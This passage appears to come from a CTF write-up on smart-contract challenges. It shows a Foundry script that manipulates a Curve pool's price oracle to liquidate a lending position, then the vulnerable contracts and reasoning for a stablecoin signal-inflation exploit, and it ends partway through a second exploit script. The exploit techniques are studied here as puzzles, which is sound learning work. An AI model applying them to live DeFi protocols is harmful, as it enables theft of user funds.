So, the `CurvePool` deployed at that time might have this kind of vulnerability. Following the traces of the transaction in given in the statement got me a `CurveStableSwapNG` **Vyper** contract. 

> Now the grinding begins, I read all the documentation about this CurveStableSwapNG from here : [CurveStableSwapNG Metapool Docs](https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity). 

Let me the paste the snippet that is matter to us. 

```python
@external
@view
@nonreentrant('lock')
def price_oracle(i: uint256) -> uint256:
    return self._calc_moving_average(
        self.last_prices_packed[i],
        self.ma_exp_time,
        self.ma_last_time & (2**128 - 1)
    )

@external
@nonreentrant('lock')
def remove_liquidity_imbalance(
    _amounts: DynArray[uint256, MAX_COINS],
    _max_burn_amount: uint256,
    _receiver: address = msg.sender
) -> uint256:
    """
    @notice Withdraw coins from the pool in an imbalanced amount
    @param _amounts List of amounts of underlying coins to withdraw
    @param _max_burn_amount Maximum amount of LP token to burn in the withdrawal
    @param _receiver Address that receives the withdrawn coins
    @return Actual amount of the LP token burned in the withdrawal
    """
    amp: uint256 = self._A()
    rates: DynArray[uint256, MAX_COINS] = self._stored_rates()
    old_balances: DynArray[uint256, MAX_COINS] = self._balances()
    D0: uint256 = self.get_D_mem(rates, old_balances, amp)
    new_balances: DynArray[uint256, MAX_COINS] = old_balances

    for i in range(MAX_COINS_128):

        if i == N_COINS_128:
            break

        if _amounts[i] != 0:
            new_balances[i] -= _amounts[i]
            self._transfer_out(i, _amounts[i], _receiver)

    D1: uint256 = self.get_D_mem(rates, new_balances, amp)
    base_fee: uint256 = self.fee * N_COINS / (4 * (N_COINS - 1))
    ys: uint256 = (D0 + D1) / N_COINS

    fees: DynArray[uint256, MAX_COINS] = empty(DynArray[uint256, MAX_COINS])
    dynamic_fee: uint256 = 0
    xs: uint256 = 0
    ideal_balance: uint256 = 0
    difference: uint256 = 0
    new_balance: uint256 = 0

    for i in range(MAX_COINS_128):

        if i == N_COINS_128:
            break

        ideal_balance = D1 * old_balances[i] / D0
        difference = 0
        new_balance = new_balances[i]

        if ideal_balance > new_balance:
            difference = ideal_balance - new_balance
        else:
            difference = new_balance - ideal_balance

        xs = unsafe_div(rates[i] * (old_balances[i] + new_balance), PRECISION)
        dynamic_fee = self._dynamic_fee(xs, ys, base_fee)
        fees.append(dynamic_fee * difference / FEE_DENOMINATOR)

        self.admin_balances[i] += fees[i] * admin_fee / FEE_DENOMINATOR
        new_balances[i] -= fees[i]

    D1 = self.get_D_mem(rates, new_balances, amp)  # dev: reuse D1 for new D.

    self.upkeep_oracles(new_balances, amp, D1)

    total_supply: uint256 = self.total_supply
    burn_amount: uint256 = ((D0 - D1) * total_supply / D0) + 1
    assert burn_amount > 1  # dev: zero tokens burned
    assert burn_amount <= _max_burn_amount, "Slippage screwed you"

    total_supply -= burn_amount
    self._burnFrom(msg.sender, burn_amount)

    log RemoveLiquidityImbalance(msg.sender, _amounts, fees, D1, total_supply)

    return burn_amount
```

I found out that `price_oracle()` is volatile and dependent on `ma_last_time`, `ma_last_time`. And the `remove_liquidity_imbalance()` will make the pool imbalance. 

Thats very interesting, let me summarize what I wanted to do here. 
    - Increase price of asset 1 by adding liquidity and removing liquidity in different blocks
    - and liquidate owner and get his 10000 balance of asset0 and 
    - Borrow remaining asset 0 balance to achieve 20000 asset 0 by depositing asset 1

Thats seems simple but you need to go through a lot of grinding there. 

Can't explain more, just read my messy exploit script. 

{% note(clickable=true, header="Oracle.s.sol") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract OracleSolve is Script {
    Oracle public oracle = Oracle(0x0F113F8Cd37DdB04c09BBf45D6fafEAa6C7b09E6);
    address player = vm.envAddress("PLAYER");
    SimplePriceOracle public simplePriceOracle;
    CurvePriceOracle public curvePriceOracle;
    ICurve public curvePool;

/*
@external
@view
@nonreentrant('lock')
def price_oracle(i: uint256) -> uint256:
    return self._calc_moving_average(
        self.last_prices_packed[i],
        self.ma_exp_time,
        self.ma_last_time & (2**128 - 1)
    )
*/
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        simplePriceOracle = SimplePriceOracle(oracle.priceOracles(0));
        curvePriceOracle = CurvePriceOracle(oracle.priceOracles(1)); // curvePool Oracle is for asset 1 
        curvePool = ICurve(curvePriceOracle.curvePool());

        console.log("Player : ", oracle.player());
        console.log("assetCount : ", oracle.assetCount());

        console.log("-------------------------------------");
        (IERC20 assetToken0, uint256 totalDeposited0, uint256 totalBorrowed0, uint256 baseRate0 ) = oracle.assets(0);
        console.log("asset0 address: ", address(assetToken0));
        console.log("asset0 totalDeposited0 : ", totalDeposited0);
        console.log("asset0 totalBorrowed0 : ", totalBorrowed0);
        console.log("asset0 baseRate0 : ", baseRate0);
        console.log("asset0 priceOracle : ", oracle.priceOracles(0));

        console.log("-------------------------------------");
        (IERC20 assetToken1, uint256 totalDeposited1, uint256 totalBorrowed1, uint256 baseRate1 ) = oracle.assets(1);
        console.log("asset1 address: ", address(assetToken1));
        console.log("asset1 totalDeposited1 : ", totalDeposited1);
        console.log("asset1 totalBorrowed1 : ", totalBorrowed1);
        console.log("asset1 baseRate1 : ", baseRate1);
        console.log("asset1 priceOracle : ", oracle.priceOracles(1));
        
        console.log("---------------Owner-----------------");
        (uint256 O_deposited0, uint256 O_borrowed0, uint256 O_lastInterestedBlock0) = oracle.getUserAccount(oracle.owner(), 0, 0 , 0);
        console.log("deposited0 : ", O_deposited0);
        console.log("borrowed0 : ", O_borrowed0);
        console.log("lastInterestedBlock0 : ", O_lastInterestedBlock0);

        (uint256 O_deposited1, uint256 O_borrowed1, uint256 O_lastInterestedBlock1) = oracle.getUserAccount(oracle.owner(), 1, 1 , 1);
        console.log("deposited1 : ", O_deposited1);
        console.log("borrowed1 : ", O_borrowed1);
        console.log("lastInterestedBlock1 : ", O_lastInterestedBlock1);

        console.log("asset0 balance : ", assetToken0.balanceOf(oracle.owner()));
        console.log("asset1 balance : ", assetToken1.balanceOf(oracle.owner()));

        console.log("oracle asset0 balance : ", assetToken0.balanceOf(address(oracle)));
        console.log("oracle asset1 balance : ", assetToken1.balanceOf(address(oracle)));
        
        console.log("---------------Player-----------------");
        (uint256 P_deposited0, uint256 P_borrowed0, uint256 P_lastInterestedBlock0) = oracle.getUserAccount(player, 0, 0 , 0);
        console.log("deposited0 : ", P_deposited0);
        console.log("borrowed0 : ", P_borrowed0);
        console.log("lastInterestedBlock0 : ", P_lastInterestedBlock0);

        (uint256 P_deposited1, uint256 P_borrowed1, uint256 P_lastInterestedBlock1) = oracle.getUserAccount(player, 1, 1 , 1);
        console.log("deposited1 : ", P_deposited1);
        console.log("borrowed1 : ", P_borrowed1);
        console.log("lastInterestedBlock1 : ", P_lastInterestedBlock1);

        console.log("asset0 balance : ", assetToken0.balanceOf(player));
        console.log("asset1 balance : ", assetToken1.balanceOf(player));
        
        
        console.log("-------------Price Oracles---------------");
        console.log("simplePriceOracle: ", address(simplePriceOracle));
        console.log("simplePriceOracle asset0 Price : ", simplePriceOracle.getAssetPrice(0));
        console.log("simplePriceOracle asset1 Price : ", simplePriceOracle.getAssetPrice(1));

        console.log("curvePriceOracle (asset 1): ", address(curvePriceOracle));
        console.log("curvePriceOracle Curve Pool : ", address(curvePool));
        console.log("Curve asset0 Price : ", curvePriceOracle.getAssetPrice(0));
        console.log("Curve asset1 Price : ", curvePriceOracle.getAssetPrice(1)); // TARGET = 1200000000000000000
        console.log("Curve SpotPrice : ", curvePriceOracle.getSpotPrice());
        console.log("-------------------------------------");

        console.log("token 0 in curve pool : ", curvePool.coins(0));
        console.log("token 1 in curve pool : ", curvePool.coins(1));


        // Goal is to reduce the price of asset 1 in the pool
        uint256 amountOfAsset0 = assetToken0.balanceOf(player);
        uint256 amountOfAsset1 = assetToken1.balanceOf(player);

        // RUN - 1, RUN - 2
        uint256[] memory amountsToAdd = new uint256[](2);
        amountsToAdd[0] = amountOfAsset0/2;
        amountsToAdd[1] = 0;
        assetToken0.approve(address(curvePool), amountOfAsset0);
        curvePool.add_liquidity(amountsToAdd, 0);
        console.log("LP balance of Player : ", curvePool.balanceOf(player));

        // RUN - 3
        uint256[] memory amountsToRemove = new uint256[](2);
        amountsToRemove[0] = 9999 ether;
        amountsToRemove[1] = 0;
        curvePool.approve(address(curvePool), curvePool.balanceOf(player));
        curvePool.remove_liquidity_imbalance(amountsToRemove, curvePool.balanceOf(player));

        //  RUN - 4
        assetToken1.approve(address(oracle), amountOfAsset1);
        oracle.liquidate(oracle.owner(), 1, amountOfAsset1, 0);
        
        //  RUN - 5
        assetToken1.approve(address(oracle), amountOfAsset1);
        oracle.deposit(1, amountOfAsset1);
        oracle.borrow(0, 1 ether);

        console.log("LP balance of Player : ", curvePool.balanceOf(player));
        console.log("asset0 balance : ", assetToken0.balanceOf(player));
        console.log("asset1 balance : ", assetToken1.balanceOf(player));

        console.log("oracle asset0 balance : ", assetToken0.balanceOf(address(oracle)));
        console.log("oracle asset1 balance : ", assetToken1.balanceOf(address(oracle)));
        
        console.log("Curve asset1 Price : ", curvePriceOracle.getAssetPrice(1)); // TARGET = 1200000000000000000
        console.log("Curve SpotPrice : ", curvePriceOracle.getSpotPrice());

        vm.stopBroadcast();

    }
}
```
{%end%}
***

# Stablecoin

P : 
"""
There is a new algorithmic stablecoin backed by ETH!

Manager owner executes the following code:

manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);

ETH.mint(address(this), 2 ether);
ETH.approve(address(manager), type(uint256).max);
manager.manage(ETH, 2 ether, true, 3395 ether, true);

(, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH)));
manager.updateSignal(debtToken, 3520 ether);
You are given 6000 of ETH. Your goal is to get 50_000_000 of MIM.
"""

{% note(clickable=true, header="StableCoin.sol") %}
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

library ProtocolMath {
    uint256 internal constant ONE = 1e18;
    uint256 internal constant MINUTES_1000_YEARS = 525_600_000;

    function mulDown(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * b) / ONE;
    }

    function divDown(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * ONE) / b;
    }

    function divUp(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        } else {
            return (((a * ONE) - 1) / b) + 1;
        }
    }

    function _decMul(uint256 x, uint256 y) internal pure returns (uint256 decProd) {
        decProd = (x * y + ONE / 2) / ONE;
    }

    function _decPow(uint256 base, uint256 exponent) internal pure returns (uint256) {
        if (exponent == 0) {
            return ONE;
        }

        uint256 y = ONE;
        uint256 x = base;
        uint256 n = Math.min(exponent, MINUTES_1000_YEARS);

        while (n > 1) {
            if (n % 2 != 0) {
                y = _decMul(x, y);
            }
            x = _decMul(x, x);
            n /= 2;
        }

        return _decMul(x, y);
    }

    function _computeHealth(uint256 collateral, uint256 debt, uint256 price) internal pure returns (uint256) {
        return debt > 0 ? collateral * price / debt : type(uint256).max;
    }
}

abstract contract ManagerAccess {
    address public immutable manager;

    error Unauthorized(address caller);

    modifier onlyManager() {
        if (msg.sender != manager) {
            revert Unauthorized(msg.sender);
        }
        _;
    }

    constructor(address _manager) {
        manager = _manager;
    }
}

contract PriceFeed {
    function fetchPrice() external pure returns (uint256, uint256) {
        return (2207 ether, 0.01 ether);
    }
}

contract Token is ERC20, ManagerAccess {
    constructor(address _manager, string memory _id) ERC20(_id, _id) ManagerAccess(_manager) {}

    function mint(address to, uint256 amount) external onlyManager {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external onlyManager {
        _burn(from, amount);
    }
}

contract ERC20Signal is ERC20, ManagerAccess {
    using ProtocolMath for uint256;

    uint256 public signal;

    constructor(address _manager, uint256 _signal, string memory _name, string memory _symbol)
        ERC20(_name, _symbol)
        ManagerAccess(_manager)
    {
        signal = _signal;
    }

    function mint(address to, uint256 amount) external onlyManager {
        _mint(to, amount.divUp(signal));
    }

    function burn(address from, uint256 amount) external onlyManager {
        _burn(from, amount == type(uint256).max ? ERC20.balanceOf(from) : amount.divUp(signal));
    }

    function setSignal(uint256 backingAmount) external onlyManager {
        uint256 supply = ERC20.totalSupply();
        uint256 newSignal = (backingAmount == 0 && supply == 0) ? ProtocolMath.ONE : backingAmount.divUp(supply);
        signal = newSignal;
    }

    function totalSupply() public view override returns (uint256) {
        return ERC20.totalSupply().mulDown(signal);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return ERC20.balanceOf(account).mulDown(signal);
    }

    function transfer(address, uint256) public pure override returns (bool) {
        revert();
    }

    function allowance(address, address) public view virtual override returns (uint256) {
        revert();
    }

    function approve(address, uint256) public virtual override returns (bool) {
        revert();
    }

    function transferFrom(address, address, uint256) public virtual override returns (bool) {
        revert();
    }

    function increaseAllowance(address, uint256) public virtual override returns (bool) {
        revert();
    }

    function decreaseAllowance(address, uint256) public virtual override returns (bool) {
        revert();
    }
}

contract Manager is Ownable {
    using SafeERC20 for IERC20;
    using ProtocolMath for uint256;

    uint256 public constant MIN_DEBT = 3000e18;
    uint256 public constant MIN_CR = 130 * ProtocolMath.ONE / 100; // 130%
    uint256 public constant DECAY_FACTOR = 999_027_758_833_783_000;

    Token public immutable mim;

    mapping(address => IERC20) public positionCollateral;
    mapping(IERC20 => Collateral) public collateralData;

    struct Collateral {
        ERC20Signal protocolCollateralToken;
        ERC20Signal protocolDebtToken;
        PriceFeed priceFeed;
        uint256 operationTime;
        uint256 baseRate;
    }

    error NothingToLiquidate();
    error CannotLiquidateLastPosition();
    error RedemptionSpreadOutOfRange();
    error NoCollateralOrDebtChange();
    error InvalidPosition();
    error NewICRLowerThanMCR(uint256 newICR);
    error NetDebtBelowMinimum(uint256 netDebt);
    error FeeExceedsMaxFee(uint256 fee, uint256 amount, uint256 maxFeePercentage);
    error PositionCollateralTokenMismatch();
    error CollateralTokenAlreadyAdded();
    error CollateralTokenNotAdded();
    error SplitLiquidationCollateralCannotBeZero();
    error WrongCollateralParamsForFullRepayment();

    constructor() {
        mim = new Token(address(this), "MIM");
    }

    function manage(
        IERC20 token,
        uint256 collateralDelta,
        bool collateralIncrease,
        uint256 debtDelta,
        bool debtIncrease
    ) external returns (uint256, uint256) {
        if (address(collateralData[token].protocolCollateralToken) == address(0)) {
            revert CollateralTokenNotAdded();
        }

        if (positionCollateral[msg.sender] != IERC20(address(0)) && positionCollateral[msg.sender] != token) {
            revert PositionCollateralTokenMismatch();
        }

        if (collateralDelta == 0 && debtDelta == 0) {
            revert NoCollateralOrDebtChange();
        }

        Collateral memory collateralTokenInfo = collateralData[token];
        ERC20Signal protocolCollateralToken = collateralTokenInfo.protocolCollateralToken;
        ERC20Signal protocolDebtToken = collateralTokenInfo.protocolDebtToken;

        uint256 debtBefore = protocolDebtToken.balanceOf(msg.sender);
        if (!debtIncrease && (debtDelta == type(uint256).max || (debtBefore != 0 && debtDelta == debtBefore))) {
            if (collateralDelta != 0 || collateralIncrease) {
                revert WrongCollateralParamsForFullRepayment();
            }
            collateralDelta = protocolCollateralToken.balanceOf(msg.sender);
            debtDelta = debtBefore;
        }

        _updateDebt(token, protocolDebtToken, debtDelta, debtIncrease);
        _updateCollateral(token, protocolCollateralToken, collateralDelta, collateralIncrease);

        uint256 debt = protocolDebtToken.balanceOf(msg.sender);
        uint256 collateral = protocolCollateralToken.balanceOf(msg.sender);

        if (debt == 0) {
            if (collateral != 0) {
                revert InvalidPosition();
            }
            _closePosition(protocolCollateralToken, protocolDebtToken, msg.sender, false);
        } else {
            _checkPosition(token, debt, collateral);

            if (debtBefore == 0) {
                positionCollateral[msg.sender] = token;
            }
        }
        return (collateralDelta, debtDelta);
    }

    function liquidate(address liquidatee) external {
        IERC20 token = positionCollateral[liquidatee];

        if (address(token) == address(0)) {
            revert NothingToLiquidate();
        }

        Collateral memory collateralTokenInfo = collateralData[token];
        ERC20Signal protocolCollateralToken = collateralTokenInfo.protocolCollateralToken;
        ERC20Signal protocolDebtToken = collateralTokenInfo.protocolDebtToken;

        uint256 wholeCollateral = protocolCollateralToken.balanceOf(liquidatee);
        uint256 wholeDebt = protocolDebtToken.balanceOf(liquidatee);

        (uint256 price,) = collateralTokenInfo.priceFeed.fetchPrice();
        uint256 health = ProtocolMath._computeHealth(wholeCollateral, wholeDebt, price);

        if (health >= MIN_CR) {
            revert NothingToLiquidate();
        }

        uint256 totalDebt = protocolDebtToken.totalSupply();
        if (wholeDebt == totalDebt) {
            revert CannotLiquidateLastPosition();
        }

        if (!(health <= ProtocolMath.ONE)) {
            mim.burn(msg.sender, wholeDebt);
            totalDebt -= wholeDebt;
        }

        token.safeTransfer(msg.sender, wholeCollateral);

        _closePosition(protocolCollateralToken, protocolDebtToken, liquidatee, true);

        _updateSignals(token, protocolCollateralToken, protocolDebtToken, totalDebt);
    }

    function addCollateralToken(IERC20 token, PriceFeed priceFeed, uint256 collateralSignal, uint256 debtSignal)
        external
        onlyOwner
    {
        ERC20Signal protocolCollateralToken = new ERC20Signal(
            address(this),
            collateralSignal,
            string(bytes.concat("MIM ", bytes(IERC20Metadata(address(token)).name()), " collateral")),
            string(bytes.concat("mim", bytes(IERC20Metadata(address(token)).symbol()), "-c"))
        );
        ERC20Signal protocolDebtToken = new ERC20Signal(
            address(this),
            debtSignal,
            string(bytes.concat("MIM ", bytes(IERC20Metadata(address(token)).name()), " debt")),
            string(bytes.concat("mim", bytes(IERC20Metadata(address(token)).symbol()), "-d"))
        );

        if (address(collateralData[token].protocolCollateralToken) != address(0)) {
            revert CollateralTokenAlreadyAdded();
        }

        Collateral memory protocolCollateralTokenInfo;
        protocolCollateralTokenInfo.protocolCollateralToken = protocolCollateralToken;
        protocolCollateralTokenInfo.protocolDebtToken = protocolDebtToken;
        protocolCollateralTokenInfo.priceFeed = priceFeed;

        collateralData[token] = protocolCollateralTokenInfo;
    }

    function _updateDebt(IERC20 token, ERC20Signal protocolDebtToken, uint256 debtDelta, bool debtIncrease) internal {
        if (debtDelta == 0) {
            return;
        }

        if (debtIncrease) {
            _decayRate(token);

            protocolDebtToken.mint(msg.sender, debtDelta);
            mim.mint(msg.sender, debtDelta);
        } else {
            protocolDebtToken.burn(msg.sender, debtDelta);
            mim.burn(msg.sender, debtDelta);
        }
    }

    function _updateCollateral(
        IERC20 token,
        ERC20Signal protocolCollateralToken,
        uint256 collateralDelta,
        bool collateralIncrease
    ) internal {
        if (collateralDelta == 0) {
            return;
        }

        if (collateralIncrease) {
            protocolCollateralToken.mint(msg.sender, collateralDelta);
            token.safeTransferFrom(msg.sender, address(this), collateralDelta);
        } else {
            protocolCollateralToken.burn(msg.sender, collateralDelta);
            token.safeTransfer(msg.sender, collateralDelta);
        }
    }

    function _updateSignals(
        IERC20 token,
        ERC20Signal protocolCollateralToken,
        ERC20Signal protocolDebtToken,
        uint256 totalDebtForCollateral
    ) internal {
        protocolDebtToken.setSignal(totalDebtForCollateral);
        protocolCollateralToken.setSignal(token.balanceOf(address(this)));
    }

    function updateSignal(ERC20Signal token, uint256 signal) external onlyOwner {
        token.setSignal(signal);
    }

    function _closePosition(
        ERC20Signal protocolCollateralToken,
        ERC20Signal protocolDebtToken,
        address position,
        bool burn
    ) internal {
        positionCollateral[position] = IERC20(address(0));

        if (burn) {
            protocolDebtToken.burn(position, type(uint256).max);
            protocolCollateralToken.burn(position, type(uint256).max);
        }
    }

    function _decayRate(IERC20 token) internal {
        uint256 decayedRate = _calcDecayedRate(token);
        require(decayedRate <= ProtocolMath.ONE);

        collateralData[token].baseRate = decayedRate;

        _updateOperationTime(token);
    }

    function _updateOperationTime(IERC20 token) internal {
        uint256 pastTime = block.timestamp - collateralData[token].operationTime;

        if (1 minutes <= pastTime) {
            collateralData[token].operationTime = block.timestamp;
        }
    }

    function _calcDecayedRate(IERC20 token) internal view returns (uint256) {
        uint256 pastMinutes = (block.timestamp - collateralData[token].operationTime) / 1 minutes;
        uint256 decay = ProtocolMath._decPow(DECAY_FACTOR, pastMinutes);

        return collateralData[token].baseRate.mulDown(decay);
    }

    function _checkPosition(IERC20 token, uint256 debt, uint256 collateral) internal view {
        if (debt < MIN_DEBT) {
            revert NetDebtBelowMinimum(debt);
        }

        (uint256 price,) = collateralData[token].priceFeed.fetchPrice();
        uint256 health = ProtocolMath._computeHealth(collateral, debt, price);
        if (health < MIN_CR) {
            revert NewICRLowerThanMCR(health);
        }
    }

    receive() external payable {}
}
contract Stablecoin {
    Token public immutable mim;
    Token public immutable eth;
    Manager public immutable manager;
    address public player;
    constructor(address _player, Token _mim, Token _eth, Manager _manager) {
        player = _player;
        mim = _mim;
        eth = _eth;
        manager = _manager;
    }
    function isSolved() external view returns (bool) {
        return mim.balanceOf(player) == 50_000_000 ether;
    }
}
```
{%end%}

## Solution

Bro, this is pain I couldn't remember what I did to solve this. Spent more than 3 days (I know I'm dumb). By doing some magic I was to solve this in the end. I'll try my best to explain that magic. 

Lets break down the StableCoin protocol,

1. **Manager (Main Contract)**
   - Handles adding collateral tokens, managing positions, and liquidations
   - Maintains collateral and debt signals for each position
   - Controls the MIM token minting and burning
   - Key functions:
     - `manage()`: Add/remove collateral and debt
     - `liquidate()`: Liquidate undercollateralized positions
     - `addCollateralToken()`: Add new collateral types
     - `updateSignal()`: Update collateral/debt signals

2. **Token**
   - ERC20 token contract for MIM stablecoin
   - Can only be minted/burned by the Manager

3. **ERC20Signal**
   - Special ERC20 implementation for protocol collateral and debt tokens
   - Uses a signal multiplier for balance calculations
   - Cannot be transferred (all transfer functions revert)
   - Key functions:
     - `mint()`: Mints tokens with signal adjustment
     - `burn()`: Burns tokens with signal adjustment
     - `setSignal()`: Updates the signal multiplier

4. **PriceFeed**
   - Simple price oracle that returns fixed prices
   - Returns (2207 ether, 0.01 ether) for price and timestamp

5. **Stablecoin**
   - Challenge contract that sets up the initial state
   - Holds references to MIM, ETH tokens, and Manager

The goal is to get 50,000,000 MIM tokens when starting with 6000 ETH.

The Manager owner did the following after protocol deployement, 
 
1. The protocol adds ETH as collateral with a simple price feed and very high limits
2. Creates an initial position with 2 ETH collateral and 3395 MIM debt
3. Updates the debt token's signal to 3520 ether (this affects debt calculations)

Same routene, initial state of the protocol.

```bash
  Stablecoin :  0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9
  Manager :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
  Manager Owner:  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
  MIM :  0x7a2B13B63367219128DD46d1ab179a542C17d48a
  MIM Manager :  0xbd79fCDe0e6dC4BC9984Eb5f5AD79EA86bABA0fB
  ETH :  0xc673093EC4446A0690Aeb98105faeB8528c50693
  ETH Manager :  0xf8C9Fb693d7c318C19ae00ABC5d24725F6cBB0BA
  protocolCollateralToken :  0xfe49524fEe1b2FeF5Dff149B1A0370cff0d68972
  protocolCollateralToken Signal:  20000000000000000000000000000000000
  protocolCollateralToken totalSupply():  2000000000000000000
  protocolDebtToken :  0x89cAaD14ca4eEA0272A2654A31A56D0a509E28fF
  protocolDebtToken Signal :  1036818851251840943
  protocolDebtToken totalSupply():  3520000000000000001485
  -------------------------------
  Manager balance of ETH :  2000000000000000000
  Manager balance of MIM :  0
  Manager Owner balance of ETH :  0
  Manager Owner balance of MIM :  3395000000000000000000
  Manager Owner balance of protocolCollateralToken :  2000000000000000000
  Manager Owner balance of protocolDebtToken :  3520000000000000001485
  Player balance of ETH :  6000000000000000000000
  Player balance of MIM :  0
  Player balance of protocolCollateralToken :  0
  Player balance of protocolDebtToken :  0
  protocolCollateralToken Signal:  20000000000000000000000000000000000
  protocolDebtToken Signal :  1036818851251840943
```

When the Manager owner added the collatoral token as ETH, `protocolCollateralToken` and `protocolDebtToken` will be deployed.  And curresponding signal values are added by the owner. 

Lets do the backtracking, our goal is to get the MIM tokens, where the transfer/mint of MIM happens? In the `_updateDebt()` internal function which is called at once in `manage()`.

So, need to understand what does this `manage()` function do. When called, it can either add or remove ETH collateral and mint or burn MIM tokens. When adding collateral, it transfers ETH from the user to the Manager and mints protocolCollateralToken to the user. When minting MIM, it creates new MIM tokens and mints protocolDebtToken to track the debt. The function uses a signal-based system where both collateral and debt tokens have signal multipliers that affect the actual balances and health calculations. The protocol checks the position's health factor after each operation to ensure proper collateralization.

```solidity
    function _updateCollateral(
        IERC20 token,
        ERC20Signal protocolCollateralToken,
        uint256 collateralDelta,
        bool collateralIncrease
    ) internal {
        if (collateralDelta == 0) {
            return;
        }

        if (collateralIncrease) {
            protocolCollateralToken.mint(msg.sender, collateralDelta);
            token.safeTransferFrom(msg.sender, address(this), collateralDelta);
        } else {
            protocolCollateralToken.burn(msg.sender, collateralDelta);
            token.safeTransfer(msg.sender, collateralDelta);
        }
    }
```

If we observe here,  While adding collatoral the collatoral token will be transferred from user to Manager and the `protocolCollateralToken` is also minted to track the user collatoral amount. And this collatoral amount will affects the health of the user. If we closely look at the `protocolCollateralToken.mint(msg.sender, collateralDelta)` line.

```solidity
function mint(address to, uint256 amount) external onlyManager {
    _mint(to, amount.divUp(signal));
}
```

Hmm, something is interesting, its not the usual mint. mint amount is calculated by doing `divUp` with the `signal`. So, can we make this `divUp()` calculation to result very large amount so that our `protocolCollatoralToken` coallatoral will be high and we can get more `mim` tokens due to increase of collatoral and health factor.

Okay, now how can we do this? By modifying the `signal` value. 

```solidity
// Manager
function _updateSignals(
    IERC20 token,
    ERC20Signal protocolCollateralToken,
    ERC20Signal protocolDebtToken,
    uint256 totalDebtForCollateral
) internal {
    protocolDebtToken.setSignal(totalDebtForCollateral);
    protocolCollateralToken.setSignal(token.balanceOf(address(this)));
}

// ERC20Signal 
function setSignal(uint256 backingAmount) external onlyManager {
    uint256 supply = ERC20.totalSupply();
    uint256 newSignal = (backingAmount == 0 && supply == 0) ? ProtocolMath.ONE : backingAmount.divUp(supply);
    signal = newSignal;
}
```
The `_updateSignals()` is called inside the `liquidate()` function. So, liquidating the manager owner will update the signals. The `protocolCollatoralToken` signal is updated with the value of `token.balanceOf(address(this))`, token here is ETH. So, since it is calculating the balance of `address(this)`, i.e manager. We can donate ETH to manager by doing `eth.transfer(address(manager), (large ETH)`. Now this causes an undefined behaviour in `setSignal()` function and the `backingAmount.divUp(supply)` will execute which make the signal value very low than compared to the initial one. 

So, we succeeded in manipulating the `protocolCollatoralToken` signal. Now the signal of the `protocolCollatoralToken` is smaller (at least less than 1e18). Now what happens if we call the `manage()` again with very small increase in `collatoralToken`?

Lets say, we called `manage(eth, 1 , true, 0, false)`. Now ultimately the following `mint()` will execute. So, now the signal showing up here is the manipulated one (we reduced it to less than 1e18). 

```solidity
function mint(address to, uint256 amount) external onlyManager {
    _mint(to, amount.divUp(signal));
}

function divUp(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    } else {
        return (((a * ONE) - 1) / b) + 1;
    }
}
````

So, the result from the `divUp()` will be very high. i.e, we are minting more `protocolCollatoralToken` by only sending only `1 wei` of ETH. But this `manage()` with only 1 wei collatoral increase should be done for several times till we got the good health factor. Once we have the very good health factor and we can able to borrow all `50,000,000` MIM in one go. 

Find my messy exploit below,

{% note(clickable=true, header="Stablecoin.s.sol") %}

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Stablecoin.sol";

contract StablecoinSolve is Script {

    Stablecoin public stablecoin = Stablecoin(0xE78Ab96cb44c5dDd3d51e2B96295b27c78D102d9);
    Manager public manager = stablecoin.manager();
    Token public mim = stablecoin.mim();
    Token public eth = stablecoin.eth();
    address player = vm.envAddress("PLAYER");

    //Manager owner executes the following code:

    // manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);

    // ETH.mint(address(this), 2 ether);
    // ETH.approve(address(manager), type(uint256).max);
    // manager.manage(ETH, 2 ether, true, 3395 ether, true);

    // (, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH)));
    // manager.updateSignal(debtToken, 3520 ether);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Stablecoin : ", address(stablecoin));
        console.log("Manager : ", address(manager));
        console.log("Manager Owner: ", address(manager.owner()));

        console.log("MIM : ", address(mim));
        console.log("MIM Manager : ", address(mim.manager()));

        console.log("ETH : ", address(eth));
        console.log("ETH Manager : ", address(eth.manager()));
        
        (ERC20Signal protocolCollateralToken,
        ERC20Signal protocolDebtToken,
        PriceFeed priceFeed,
        uint256 operationTime,
        uint256 baseRate ) =  manager.collateralData(IERC20(eth));
        console.log("protocolCollateralToken : ", address(protocolCollateralToken));
        console.log("protocolCollateralToken Signal: ", protocolCollateralToken.signal());
        console.log("protocolCollateralToken totalSupply(): ", protocolCollateralToken.totalSupply());

        console.log("protocolDebtToken : ", address(protocolDebtToken));
        console.log("protocolDebtToken Signal : ", protocolDebtToken.signal());
        console.log("protocolDebtToken totalSupply(): ", protocolDebtToken.totalSupply());

        console.log("-------------------------------");
        console.log("Manager balance of ETH : ", eth.balanceOf(address(manager)));
        console.log("Manager balance of MIM : ", mim.balanceOf(address(manager)));
